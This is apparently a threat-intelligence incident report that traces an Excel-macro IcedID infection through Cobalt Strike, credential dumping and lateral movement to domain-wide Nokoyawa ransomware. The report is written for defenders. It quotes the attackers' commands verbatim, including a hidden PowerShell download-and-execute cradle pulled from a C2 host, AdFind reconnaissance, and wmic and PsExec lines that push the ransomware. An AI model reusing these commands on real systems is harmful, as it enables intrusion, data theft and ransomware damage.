title: IcedID Macro Ends in Nokoyawa Ransomware---

Threat actors have moved to other means of initial access, such as ISO files combined with LNKs or OneNote payloads, but some appearances of VBA macros in Office documents can still be seen in use.
In this case we document an incident taking place during Q4 of 2022 consisting of threat actors targeting
Italian
organizations with Excel maldocs that deploy IcedID. The threat actors deploying such a campaign may hope to target organizations who have not updated their Microsoft Office deployments after the newly released patches to
block macros on documents downloaded from the internet
.
We have
previously
reported
on IcedID intrusions that have migrated to ISO files, however, this report is one of the most recent that will focus on the traditional Excel/macro intrusion vector.
Once inside, the threat actors pivoted using Cobalt Strike and RDP before a domain wide deployment of Nokoyawa ransomware with the help of PsExec. Nokowaya ransomware is a family with ties to

Case Summary
This intrusion began with a malicious Excel document. We assess with medium-high confidence that this document was delivered as part of a malicious email campaign during the first half of October 2022, based on public reporting that overlaps with multiple characteristics observed. Upon opening the Excel document, the macros would be executed when a user clicked on an embedded image. The macro code was responsible for downloading and writing an IcedID DLL payload to disk. The macro then used a renamed rundll32 binary to execute the malicious DLL.
After reaching out to the initial command and control server, automated discovery ran from the IcedID process around two minutes after execution. This discovery used the same suite of Microsoft binaries as we have
previously
reported
for the IcedID malware family. At this time, the malware also established persistence on the beachhead host using a scheduled task.
Around two hours after the initial malware ran, IcedID loaded several Cobalt Strike beacons on the beachhead. Within minutes of running Cobalt Strike on the beachhead the threat actors proceeded to elevate to SYSTEM permissions and dump LSASS memory using the beacons. Following this activity, the threat actors conducted further reconnaissance, and then moved laterally to a Domain Controller through the execution of a Cobalt Strike payload via WMI.
Next, discovery tasks continued from the beachhead host, including network scans for port 1433 (MSSQL) and browsing network shares with an interest in password files. The threat actors appeared to have removed some contents of the network shares off the network as canary files report the documents being opened off network minutes later. After this, the threat actors remained quiet over the next several days.
On the fourth day, the threat actors returned briefly to execute a few commands on the Domain Controller related to the enumeration of domain computers and high privilege user account groups. Privilege escalation was also observed on the system via named pipe impersonation.
Early on the sixth day, the threat actors became active again launching the Edge browser on the beachhead host and appeared to download a file from dropmefiles[.]com. But after completing this, they went silent again for around another eight hours. Then, from the beachhead host, a new process was spawned from the IcedID malware; and from this shell, the threat actors began enumerating Active Directory using adget and AdFind.
The threat actors then began to spread laterally using a combination of Cobalt Strike beacon DLLs, batch scripts, and WMI commands. More credential dumping was observed, followed by additional AdFind and other Windows discovery commands. The threat actors then continued lateral movement and began checking RDP access across the environment. A batch file was run enumerating hostnames throughout the environment using nslookup. Some further pivoting around systems and targeted discovery continued throughout the rest of the day.
On the seventh day, around 23 hours since the last activity in the environment the threat actors began the final phase of the intrusion. The threat actors connected to a compromised server via RDP. From this server they would stage the ransomware deployment. They deployed the ransomware payload, Sysinternals PsExec, and a cluster of batch files 1.bat-6.bat and p.bat. Opening a command prompt, they moved through executing the batch files copying p.bat, a renamed PsExec, and the ransomware payload to all domain joined hosts. They then used the batch scripts to execute the ransomware payload via PsExec and WMI.
The time to ransomware (TTR) was around 148 hours (~6 days) from the initial infection. After the intrusion, contact was made with the threat actors using their support site and the price of the ransom was quoted around $200,000 USD in Bitcoin. No ransom was paid as a result of this intrusion.

MITRE ATT&CK
Initial Access
This intrusion is linked to an IcedID malspam campaign that was observed in October 2022 targeting Italian organizations based on overlap in the maldoc template and the IcedID C2 server.
https://twitter.com/reecdeep/status/1577979717717721088?s=20&t=QWDIpjACeLzPOEy4DDGnUQ
This case involved an IcedID payload delivered through an Excel maldoc containing VBA macros that were linked to the two images embedded in the document, which caused the macros to execute when a user clicks on either of the images:
The macro associated with the maldoc reached out to a hard-coded domain and downloaded the first stage IcedID payload. More on this in the next section.
Execution
IcedID
Once the VBA macro was invoked, Excel connected to the hard-coded domain and downloaded the first stage of the IcedID payload.
When the VBA macro from Excel calls out to the hard-coded domain, it has multiple interesting characteristics, including:
Two OPTIONS requests followed by a GET request.
User-agent fields mentioning Microsoft Office.
Specific HTTP headers such as
X-Office-Major-Version
,
X-MSGETWEBURL
,
X-IDCRL_ACCEPTED
, and
UA-CPU
.
Once the IcedID payload is successfully retrieved, it will be decoded with Base64 and written to disk. In this case, the payload was written to the path retrieved from
Application.DefaultFilePath
, which is the default path used by Excel when it opens files.
The random name generated for the IcedID payload may be either 1 to 7 random digits, or
4500
. This is because the
Rnd
function will return “
a value less than 1 but greater than or equal to zero
“.
Once the IcedID payload is successfully written to disk, the following post deployment steps are initiated:
Rundll32.exe is copied into a file named calc.exe under the path returned by
Application.DefaultFilePath
.
Calc.exe (renamed rundll32.exe) is used to invoke the IcedID payload.
In this case, rundll32.exe was copied into the user Documents folder and named calc.exe. The name ‘calc.exe’ is hard-coded into the VBA code and will not be changed.
Once the VBA macros invoked the IcedID payload, the parent-child process relationship between Excel and calc.exe was observed.
The following diagram provides a visual summary of the process to execute IcedID on the endpoint.
IcedID VNC
The threat actors were observed making use of an VNC module that was spawned by IcedID to spawn the Microsoft Edge browser:
We were able to reconstruct some of the VNC traffic thanks to
@0xThiebaut
‘s tool
PCAPeek
. You can see the below options such as Edge, Chrome, Firefox, CMD, Task Manager and run dialog. Based on the visual it appears to be the KeyHole VNC module
reported first observed
in Oct 2022 by NVISO.
In another instance, a run dialog was observed being used to execute the calc.exe file that was created earlier. More information can be found about this
here
.
However, the command below would have no effect in this case as calc.exe is a renamed version of rundll32 and no parameters were passed.
Several other programs were seen run in this manner, as seen in process execution logs below:
Cobalt Strike
The threat actors used Cobalt Strike beacons throughout the intrusion. The first beacon was executed via PowerShell, which in turn was executed initially by a command shell which was started by the IcedID malware at the same time a DLL beacon was also executed.
The downloaded PowerShell payload, previously hosted on hxxps://aicsoftware[.]com:757/coin, is available on
VirusTotal
. Here is the content of the payload, where we can observe an object being created in memory using an encoded string. We will walk through decoding this string to view the Cobalt Strike configuration present within.

After initial Base64 decoding, we found the payload used the
default Cobalt Strike XOR value of 35
which allows for the next step of decoding the payload.
Second stage decoding:
After this an MZ header can be observed. From there, the data can be saved and reviewed using

Guessing Cobalt Strike version: 4.2 (max 0x003a)
Sanity check Cobalt Strike config: OK
After using PowerShell beacons during the first day on the beachhead host and a Domain Controller, the threat actors moved to using DLL files exclusively for the remainder of Cobalt Strike beacons deployed during the intrusion. Other notable executions included the use of batch files:
C:\Windows\system32\cmd.exe /c c:\windows\temp\1.bat
-> rundll32.exe c:\windows\temp\1.dll, DllRegisterServer
Persistence
During the initial execution of IcedID, the following two files were created under the AppData Roaming folder of the user that executed it:
exdudipo.dll
: IcedID first stage.
license.dat
: Encoded version of the second stage which the first stage will load into memory.
A scheduled task was created that contained instructions on executing the IcedID DLL and the location of the license.dat file. This is a very common method that IcedID has used for persistence.

Privilege Escalation
Privilege escalation was completed on two systems via the named pipe
GetSystem
feature within the Cobalt Strike tool. An example is shown below via Sysmon event ID 1 – ProcessCreate Rule:
Defense Evasion
This intrusion displayed numerous techniques used by threat actors to evade detection.
Process Injection
The adversary was seen injecting code into legitimate processes via
CreateRemoteThread
which can be detected using Sysmon event ID 8.

File Deletion
Files that were dropped in temporary directories were deleted after execution as seen below with Sysmon event ID 11 and 23.
Below is the list of files seen being created and later deleted by the threat actor:

Renamed System Utilities
Adversaries typically rename common Windows system utilities to avoid triggering alerts that monitor utility usage. The table below summaries the renamed utilities observed in this intrusion.
Windows Utility
Renamed Windows Utility
rundll32.exe
C:\Users\<REDACTED>\Documents\calc.exe
psexesvc.exe
C:\Windows\mstdc.exe
Credential Access
The threat actors were observed accessing a file server, and browsing though files related to passwords. These would later be observed opened off network, more details in the
exfiltration section
on that activity.
On the second day of the intrusion, after moving laterally to a Domain Controller, LSASS was accessed from a Cobalt Strike process. The access granted value 0x1010 was observed. As
noted in a previous report
, this value matches known
mimikatz access patterns
. This logged event suggests Cobalt Strike accessed LSASS to dump credentials from memory. This activity was observed again on various hosts on the fourth and sixth days of the intrusion.
Discovery
The discovery phase primarily utilized built-in Windows tools. One utility seen was
chcp
which allows you to display or set the code page number. The default
chcp
value is determined by the Windows locale. The locale can indicate the language, country, and regional standards of that host (e.g. date and time formatting). After viewing the default page code, the adversary did change the value to 65001 to reflect the UTF-8 character set. We have seen this as a technique employed by IcedID for some time as reported in depth in
prior cases
.

Following the initial discovery commands mentioned above on day one, the threat actor scanned the network for port 1433, the default port used by Microsoft SQL server.
The discovery phase remained minimal leading into day six. The threat actors were seen dropping AdFind and adget.exe to reveal all users, groups, computers, organizational units, subnets, and trust objects within the domain.
adfind.exe -gcb -sc trustdmp
adfind.exe -f (objectcategory=group)
adfind.exe -subnets -f (objectCategory=subnet)
adfind.exe -f (objectcategory=organizationalUnit)
adfind.exe -f objectcategory=computer
adfind.exe -f (objectcategory=person)
Adget is a newer tool that we first observed in this
previous report
but generally this tool performs similar AD discovery as AdFind.
Following the Active Directory discovery activity, additional remote discovery actions were observed using WMI to gather information about Windows OS version and licensing on the hosts.
C:\Windows\system32\cmd.exe /C wmic /node:"REDACTED" /user:"USER" /password:"REDACTED" os get caption
Then another recon round occurred using NSLOOKUP to map assets to IP addresses.
This was followed by network scans for RDP:
Lateral Movement
During this intrusion, threat actors used a number of different techniques to move laterally across the domain. The techniques used will be detailed in the following sections.
T1021.006 Remote Services: WinRM
Some of the threat actors’ lateral activity was executed using WinRM, this could be observed by matching parent-child process trees and DCE RPC traffic.
T1047 WMI
Threat Actors ran the following command to download and execute an in memory PowerShell payload on a domain controller:
C:\\Windows\\System32\\wbem\\wmic.exe  /node:REDACTED process call create \""cmd.exe /c powershell.exe -nop -w hidden -c \""\""IEX ((new-object net.webclient).downloadstring('https://aicsoftware[.]com:757/coin'))\""\"""
WMI was also used also when executing remote DLL beacons:
C:\Windows\system32\cmd.exe /C wmic /node:"REDACTED" process call create "c:\windows\system32\rundll32.exe c:\windows\temp\1.dll, DllRegisterServer
WMI commands were also observed during ransom deployment:
wmic /node:REDACTED /user:DOMAIN\USER /password:REDACTED process call create cmd.exe /c copy \\REDACTED\c$\windows\temp\p.bat c:\windows\temp
T1021.002 Remote Services: SMB/Windows Admin Shares
The threat actors relied on SMB to move their tools throughout the network during the intrusion.
The threat actors used PSExec to move laterally to servers during the ransom execution, the -r flag was used to rename the binary created on the remote server to
mstdc.exe
.
Below are some of the PsExec forensic artifacts logged in Windows Event Logs and Sysmon:
Overview of the mstdc.exe binary (renamed psexecsvc.exe):
Renaming PsExec is likely an action taken by threat actors to bypass basic PsExec anomaly rules. However, there are Sigma rules which detect this specific technique, as
shared
by Florian Roth back in 2019.
They also employed use of the Windows copy utility to move files around the network via SMB:
cmd.exe /c copy \\REDACTED\c$\windows\temp\p.bat c:\windows\temp\
T1021.001 Remote Services: RDP
Threat actors also used RDP during this intrusion. Below is an example of forensic artifacts left after using RDP to move laterally from the beachhead to one of the domain servers logged in Windows Event Logs using different providers:
Collection
During discovery actions, the threat actors were observed using 7-Zip to archive data collected from active directory using AdFind.
7.exe a -mx3 ad.7z ad_*
Command and Control

Connections to one of the IcedID servers was observed in memory dumps from the beachhead host. This evidence is consistent with the connections to 45.66.248[.]119 observed from the renamed rundll32.exe that loaded the IcedID DLL during maldoc execution at the beginning of this case.
BackConnect VNC
During the intrusion we also observed connections to a BackConnect VNC IP address. These connections were also spawned from the running IcedID process on the beachhead host.
Alerts from
Lenny Hansson
‘s
ruleset
fired on the traffic for the following alerts:
Suricata Alert

8080
NF – Malware IcedID BackConnect – Start VNC command – 11
137.74.104.108
8080
Here’s another look at the VNC GUI from the attackers standpoint.
In the
execution section
we covered utilities launched by the threat actors from the VNC activity.
Web Service
On the sixth day, the threat actors launched an Edge browser on the beachhead host, via VNC as described in the execution section, and connected to the site dropmefiles[.]com a site that offers free file transfer services. Data connections from the Edge browser in the SRUMDB indicate that a file download occurred but we were unable to determine what the file was or its purpose related to the intrusion.
Cobalt Strike
T1071 / S0154
The threat actors dropped and executed a malicious DLL, p1.dll, on the beachhead. This malicious DLL is a Cobalt Strike beacon reaching out to 23.29.115.152/aicsoftware[.]com on ports 757 and 8080. Later the threat actors also injected further beacons into memory reaching out to 50.3.132.232 /iconnectgs[.]com on port 8081. Later on day six, the threat actors added a new Cobalt Strike server to the intrusion, 5.8.18.242 on port 443 (see below for visualizing this activity).
Beaconing

Exfiltration
During the intrusion, the threat actors targeted password documents on network shares. We observed these being taken and opened off network through the use of canaries. No overt exfiltration was observed so we assess that this occurred over existing command and control channels.
The threat actors opened the document from the IP:
45.61.139.126
Impact
Threat Actors deployed Nokoyawa ransomware from one of the servers using WMI and PsExec. They first copied the ransomware binary,k.exe, and a batch script p.bat using WMI:
wmic /node:"TARGET_HOST_IP" /user:"DOMAIN\USER" /password:"PASSWORD" process call create "cmd.exe /c copy \\SOURCE_SERVER_IP\c$\windows\temp\p.bat c:\windows\temp\"
Command spawned by WmiPrvSE.exe:
cmd.exe /c copy \\SOURCE_SERVER_IP\c$\windows\temp\k.exe c:\windows\temp\
A snippet of SMB network traffic generated by the above command:
The p.bat is a simple batch script that runs the k.exe binary with a Base64 encoded configuration:
c:\windows\temp\k.exe --config REDACTED
The redacted parameter used by the `–config` flag decodes to:
{"EXTENSION": "AWAYOKON", "NOTE_NAME": "AWAYOKON-readme.txt", "NOTE_CONTENT": "REDACTED", "ECC_PUBLIC": "lHrYQm+P3IbmyjTop2FK0qUdwOcSgHuFiT+r77bT4w0=", "SKIP_DIRS": ["windows", "program files", "program files (x86)", "appdata", "programdata", "system volume information", ""], "SKIP_EXTS": [".exe", ".dll", ".ini", ".lnk", ".url", ""], "ENCRYPT_NETWORK": true, "LOAD_HIDDEN_DRIVES": true, "DELETE_SHADOW": true}
The decoded configuration file shows the ransomware extension, the note name, and the note content encoded in Base64. The threat actors also configured a number of directories and extensions to skip, and enabled network and hidden drives encryption. The DELETE_SHADOW was set to true, in order to delete volume shadow copies.
Based on the configuration parameters being passed via command line and the code written in C++, the deployment appears to be part of the
1.1 version of the Nokoyawa
code base:
Ransomware sample code signature:
Debug information shows that the binary was generated a few hours before the encryption:
The ransomware was then deployed at scale using PsExec to encrypt the Windows domain:
psexec.exe  \\TARGET_HOST_IP -u DOMAIN\USER -p "PASSWORD" -s -d -h -r mstdc -accepteula -nobanner c:\windows\temp\p.bat
A ransom message was left in each directory where files were encrypted.
After encryption, contact was made with the threat actors using their support site and the price of the ransom was quoted at ~$200,000 USD in Bitcoin. No ransom was paid as a result of this intrusion.
